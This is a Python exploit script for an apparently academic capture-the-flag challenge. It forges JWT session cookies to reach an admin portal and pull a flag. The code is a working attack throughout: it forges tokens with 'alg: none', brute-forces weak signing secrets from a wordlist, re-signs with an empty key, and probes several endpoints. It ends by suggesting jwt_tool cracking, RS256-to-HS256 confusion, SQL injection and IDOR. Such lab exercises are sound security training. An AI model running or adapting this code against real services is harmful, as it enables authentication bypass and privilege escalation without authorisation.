#!/usr/bin/env python3
"""
JWT Token Manipulation Challenge
================================

Challenge: http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080/

Hints from page:
- "check_cookies_inspector" - Look at cookies
- "Token Overflow" - JWT manipulation
- Access Level: Guest
- Admin Portal requires elevated access

Goal: Manipulate JWT token to gain admin access and retrieve flag

"""

import requests
import jwt
import json
import base64
from datetime import datetime, timedelta

# Challenge URL
BASE_URL = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"

def decode_jwt(token):
    """Decode JWT token without verification to see contents."""
    try:
        # Decode header
        header = jwt.get_unverified_header(token)
        
        # Decode payload
        payload = jwt.decode(token, options={"verify_signature": False})
        
        return header, payload
    except Exception as e:
        print(f"Error decoding JWT: {e}")
        return None, None


def analyze_token():
    """Fetch the page and analyze the JWT token in cookies."""
    print("="*70)
    print("STEP 1: ANALYZING JWT TOKEN")
    print("="*70)
    print()
    
    # Make initial request
    print(f"[*] Fetching: {BASE_URL}")
    response = requests.get(BASE_URL)
    
    print(f"[*] Status Code: {response.status_code}")
    print()
    
    # Check cookies
    print("[*] Cookies received:")
    for cookie_name, cookie_value in response.cookies.items():
        print(f"    {cookie_name}: {cookie_value[:50]}{'...' if len(cookie_value) > 50 else ''}")
    print()
    
    # Look for JWT token (commonly named: token, auth, session, jwt)
    token = None
    token_name = None
    
    for possible_name in ['token', 'auth', 'session', 'jwt', 'access_token']:
        if possible_name in response.cookies:
            token = response.cookies[possible_name]
            token_name = possible_name
            break
    
    if not token:
        # Try to find any JWT-like cookie (contains two dots)
        for name, value in response.cookies.items():
            if value.count('.') == 2:
                token = value
                token_name = name
                break
    
    if not token:
        print("[-] No JWT token found in cookies!")
        print("[*] Available cookies:", list(response.cookies.keys()))
        return None, None, response
    
    print(f"[+] Found JWT token in cookie: {token_name}")
    print(f"[*] Token: {token[:30]}...{token[-30:]}")
    print()
    
    # Decode token
    header, payload = decode_jwt(token)
    
    if header and payload:
        print("[+] JWT Header:")
        print(json.dumps(header, indent=2))
        print()
        print("[+] JWT Payload:")
        print(json.dumps(payload, indent=2))
        print()
    
    return token, token_name, response


def exploit_none_algorithm(original_token, token_name):
    """
    Exploit 1: Algorithm Confusion - Change to 'none'
    
    If the server doesn't properly validate the algorithm,
    we can change it to 'none' and remove signature.
    """
    print("="*70)
    print("EXPLOIT 1: ALGORITHM CONFUSION (none)")
    print("="*70)
    print()
    
    try:
        # Decode original token
        header, payload = decode_jwt(original_token)
        
        # Modify payload
        payload['role'] = 'admin'
        payload['access_level'] = 'admin'
        payload['username'] = 'admin'
        payload['is_admin'] = True
        
        # Change algorithm to none
        header['alg'] = 'none'
        
        # Encode header and payload
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        # Create token with empty signature
        forged_token = f"{header_encoded}.{payload_encoded}."
        
        print("[*] Modified payload:")
        print(json.dumps(payload, indent=2))
        print()
        print(f"[*] Forged token: {forged_token[:50]}...")
        print()
        
        # Test the token
        print("[*] Testing forged token on /admin endpoint...")
        cookies = {token_name: forged_token}
        response = requests.get(f"{BASE_URL}/admin", cookies=cookies)
        
        print(f"[*] Response status: {response.status_code}")
        print()
        
        if response.status_code == 200 and 'CTF{' in response.text:
            print("[+] SUCCESS! Flag found:")
            # Extract flag
            import re
            flags = re.findall(r'CTF\{[^}]+\}', response.text)
            for flag in flags:
                print(f"    üö© {flag}")
            print()
            return True, response.text
        else:
            print("[-] Algorithm confusion failed")
            print(f"[*] Response: {response.text[:200]}")
            print()
            return False, None
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, None


def exploit_weak_secret(original_token, token_name):
    """
    Exploit 2: Brute force weak secret
    
    Try common weak secrets like 'secret', 'password', etc.
    """
    print("="*70)
    print("EXPLOIT 2: WEAK SECRET BRUTE FORCE")
    print("="*70)
    print()
    
    weak_secrets = [
        'secret', 'password', '123456', 'admin', 'root',
        'qwerty', 'letmein', 'secret123', 'password123',
        '', 'key', 'jwt', 'token', 'auth', 'test'
    ]
    
    try:
        header, payload = decode_jwt(original_token)
        
        # Modify payload for admin access
        payload['role'] = 'admin'
        payload['access_level'] = 'admin'
        payload['username'] = 'admin'
        payload['is_admin'] = True
        
        print("[*] Trying common secrets...")
        
        for secret in weak_secrets:
            try:
                # Sign token with this secret
                forged_token = jwt.encode(payload, secret, algorithm='HS256')
                
                # Test the token
                cookies = {token_name: forged_token}
                response = requests.get(f"{BASE_URL}/admin", cookies=cookies)
                
                if response.status_code == 200 and 'CTF{' in response.text:
                    print(f"[+] SUCCESS with secret: '{secret}'")
                    print()
                    
                    # Extract flag
                    import re
                    flags = re.findall(r'CTF\{[^}]+\}', response.text)
                    for flag in flags:
                        print(f"    üö© {flag}")
                    print()
                    return True, response.text
                    
            except Exception:
                continue
        
        print("[-] No weak secret found")
        print()
        return False, None
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, None


def exploit_role_manipulation(original_token, token_name):
    """
    Exploit 3: Simple role manipulation with original signature
    
    Sometimes the server doesn't verify the signature properly.
    """
    print("="*70)
    print("EXPLOIT 3: ROLE MANIPULATION (No Signature Verification)")
    print("="*70)
    print()
    
    try:
        header, payload = decode_jwt(original_token)
        
        # Try different role/access modifications
        modifications = [
            {'role': 'admin'},
            {'access_level': 'admin'},
            {'username': 'admin'},
            {'is_admin': True},
            {'role': 'admin', 'access_level': 'admin'},
            {'admin': True},
            {'privilege': 'admin'},
        ]
        
        for mod in modifications:
            # Modify payload
            modified_payload = payload.copy()
            modified_payload.update(mod)
            
            # Sign with empty string (might work if no verification)
            forged_token = jwt.encode(modified_payload, '', algorithm='HS256')
            
            print(f"[*] Trying: {mod}")
            
            cookies = {token_name: forged_token}
            response = requests.get(f"{BASE_URL}/admin", cookies=cookies)
            
            if response.status_code == 200 and 'CTF{' in response.text:
                print(f"[+] SUCCESS with modification: {mod}")
                print()
                
                import re
                flags = re.findall(r'CTF\{[^}]+\}', response.text)
                for flag in flags:
                    print(f"    üö© {flag}")
                print()
                return True, response.text
        
        print("[-] Role manipulation failed")
        print()
        return False, None
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, None


def test_all_endpoints(token_name, forged_token):
    """Test forged token on all possible endpoints."""
    print("="*70)
    print("TESTING ALL ENDPOINTS")
    print("="*70)
    print()
    
    endpoints = ['/', '/admin', '/profile', '/flag', '/secret', '/dashboard']
    cookies = {token_name: forged_token}
    
    for endpoint in endpoints:
        try:
            url = f"{BASE_URL}{endpoint}"
            print(f"[*] Testing: {url}")
            response = requests.get(url, cookies=cookies)
            print(f"    Status: {response.status_code}")
            
            if 'CTF{' in response.text:
                import re
                flags = re.findall(r'CTF\{[^}]+\}', response.text)
                print(f"    üö© FLAGS FOUND: {flags}")
            print()
            
        except Exception as e:
            print(f"    Error: {e}")
            print()


def main():
    """Main exploitation function."""
    print()
    print("  ‚ï¶‚ï¶ ‚ï¶‚ïî‚ï¶‚ïó  ‚ïî‚ïê‚ïó‚ïê‚ïó ‚ï¶‚ïî‚ïê‚ïó‚ï¶  ‚ïî‚ïê‚ïó‚ï¶‚ïî‚ï¶‚ïó")
    print("  ‚ïë‚ïë‚ïë‚ïë ‚ïë   ‚ïë‚ï£ ‚ïî‚ï©‚ï¶‚ïù‚ï†‚ïê‚ïù‚ïë  ‚ïë ‚ïë‚ïë ‚ïë ")
    print(" ‚ïö‚ïù‚ïö‚ï©‚ïù ‚ï©   ‚ïö‚ïê‚ïù‚ï© ‚ïö‚ïê‚ï©  ‚ï©‚ïê‚ïù‚ïö‚ïê‚ïù‚ï© ‚ï© ")
    print("   Token Manipulation Challenge")
    print()
    
    # Step 1: Analyze the token
    original_token, token_name, initial_response = analyze_token()
    
    if not original_token:
        print("[-] Could not find JWT token. Exiting.")
        return
    
    # Try all exploits
    exploits = [
        ("Algorithm Confusion", exploit_none_algorithm),
        ("Weak Secret", exploit_weak_secret),
        ("Role Manipulation", exploit_role_manipulation),
    ]
    
    for exploit_name, exploit_func in exploits:
        success, response_text = exploit_func(original_token, token_name)
        if success:
            print("="*70)
            print(f"‚úì EXPLOITATION SUCCESSFUL: {exploit_name}")
            print("="*70)
            print()
            print("Full response:")
            print(response_text[:500])
            print()
            return
    
    print("="*70)
    print("ALL EXPLOITS FAILED")
    print("="*70)
    print()
    print("Additional steps to try:")
    print("1. Use jwt_tool for advanced attacks:")
    print("   jwt_tool <token> -C -d wordlist.txt")
    print()
    print("2. Try RS256 to HS256 confusion")
    print("3. Check for SQL injection in username")
    print("4. Look for IDOR vulnerabilities")
    print()


if __name__ == "__main__":
    main()
